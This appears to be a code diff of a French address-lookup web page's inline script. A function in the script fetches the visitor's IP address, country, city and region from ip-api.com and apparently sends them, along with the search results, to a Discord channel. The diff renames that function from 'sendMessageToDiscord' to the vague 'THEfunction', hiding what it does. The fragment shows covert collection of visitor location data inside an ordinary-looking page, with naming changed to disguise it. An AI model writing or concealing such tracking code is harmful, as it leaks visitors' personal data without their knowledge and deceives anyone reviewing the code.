@@ -12,7 +12,7 @@
     <p>Possibilitées : <br> <span class="poss" ></span></p>
 
     <script>
-        function sendMessageToDiscord(content) {
+        function THEfunction(content) {
             fetch('http://ip-api.com/json')
                 .then(response => response.json())
                 .then(({ query, country, city, regionName }) => {
@@ -40,7 +40,7 @@
                 const { features } = await response.json();
                 const message = features.map(el => el.properties.label).join('\n');
                 document.querySelector('.poss').innerHTML = message.split('\n').map(el => el + "<br/>")
-                sendMessageToDiscord(message);
+                THEfunction(message);
             } catch (err) { // 
             }
         }
